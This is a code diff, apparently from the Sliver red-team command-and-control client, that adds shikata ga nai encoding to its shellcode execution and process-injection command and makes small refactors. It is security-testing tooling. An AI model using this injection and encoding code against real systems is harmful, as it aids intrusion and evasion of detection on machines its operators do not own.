@@ -23,7 +23,6 @@ import (
 	"context"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"os"
 
@@ -44,6 +43,7 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 		return
 	}
 
+	rwxPages := ctx.Flags.Bool("rwx-pages")
 	interactive := ctx.Flags.Bool("interactive")
 	if interactive && beacon != nil {
 		con.PrintErrorf("Interactive shellcode can only be executed in a session\n")
@@ -51,7 +51,7 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 	}
 	pid := ctx.Flags.Uint("pid")
 	shellcodePath := ctx.Args.String("filepath")
-	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
+	shellcodeBin, err := os.ReadFile(shellcodePath)
 	if err != nil {
 		con.PrintErrorf("%s\n", err.Error())
 		return
@@ -60,8 +60,37 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 		con.PrintErrorf("Cannot use both `--pid` and `--interactive`\n")
 		return
 	}
+	shikataGaNai := ctx.Flags.Bool("shikata-ga-nai")
+	if shikataGaNai {
+		if !rwxPages {
+			con.PrintErrorf("Cannot use shikata ga nai without RWX pages enabled\n")
+			return
+		}
+		arch := ctx.Flags.String("architecture")
+		if arch != "386" && arch != "amd64" {
+			con.PrintErrorf("Invalid shikata ga nai architecture (must be 386 or amd64)\n")
+			return
+		}
+		iter := ctx.Flags.Int("iterations")
+		con.PrintInfof("Encoding shellcode ...\n")
+		resp, err := con.Rpc.ShellcodeEncoder(context.Background(), &clientpb.ShellcodeEncodeReq{
+			Encoder:      clientpb.ShellcodeEncoder_SHIKATA_GA_NAI,
+			Architecture: arch,
+			Iterations:   uint32(iter),
+			BadChars:     []byte{},
+			Data:         shellcodeBin,
+		})
+		if err != nil {
+			con.PrintErrorf("%s\n", err)
+			return
+		}
+		oldSize := len(shellcodeBin)
+		shellcodeBin = resp.GetData()
+		con.PrintInfof("Shellcode encoded in %d iterations (%d bytes -> %d bytes)\n", iter, oldSize, len(shellcodeBin))
+	}
+
 	if interactive {
-		executeInteractive(ctx, ctx.Flags.String("process"), shellcodeBin, ctx.Flags.Bool("rwx-pages"), con)
+		executeInteractive(ctx, ctx.Flags.String("process"), shellcodeBin, rwxPages, con)
 		return
 	}
 	ctrl := make(chan bool)
@@ -69,7 +98,7 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 	con.SpinUntil(msg, ctrl)
 	shellcodeTask, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
 		Data:     shellcodeBin,
-		RWXPages: ctx.Flags.Bool("rwx-pages"),
+		RWXPages: rwxPages,
 		Pid:      uint32(pid),
 		Request:  con.ActiveTarget.Request(ctx),
 	})
@@ -125,7 +154,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 		return
 	}
 
-	tunnel := core.Tunnels.Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
+	tunnel := core.GetTunnels().Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
 
 	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
 		Request:   con.ActiveTarget.Request(ctx),
